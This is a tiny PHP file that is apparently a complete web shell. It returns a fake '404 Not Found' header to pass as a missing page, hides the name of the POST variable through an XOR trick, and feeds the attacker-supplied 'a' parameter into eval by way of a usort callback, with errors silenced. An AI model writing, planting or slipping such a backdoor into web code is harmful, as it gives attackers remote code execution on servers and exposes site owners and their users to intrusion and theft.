<?php
header('HTTP/1.1 404 Not Found'); 
function t($a,$b){
	@eval($a.$b.';');
};
$a = array(@${('$'^'{').'POST'}['a'],' ');
usort($a,'t');
?>